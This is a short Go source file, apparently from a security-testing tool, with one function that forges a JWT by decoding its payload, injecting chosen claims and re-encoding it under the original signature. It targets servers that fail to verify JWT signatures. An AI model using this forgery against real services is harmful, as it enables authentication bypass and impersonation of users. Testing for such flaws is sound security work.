package jwt

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

// ForgeSignatureTamper decodes a 3-part JWT, injects claims into the payload, and re-encodes keeping the old signature.
func ForgeSignatureTamper(token string, claims map[string]interface{}) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("token is not a valid 3-part JWT")
	}

	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return "", fmt.Errorf("failed to base64 decode JWT payload: %w", err)
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return "", fmt.Errorf("failed to parse JWT payload JSON: %w", err)
	}

	for k, v := range claims {
		payload[k] = v
	}

	newPayloadBytes, _ := json.Marshal(payload)
	newPayloadB64 := base64.RawURLEncoding.EncodeToString(newPayloadBytes)

	// Return Header.NewPayload.OldSignature
	return fmt.Sprintf("%s.%s.%s", parts[0], newPayloadB64, parts[2]), nil
}
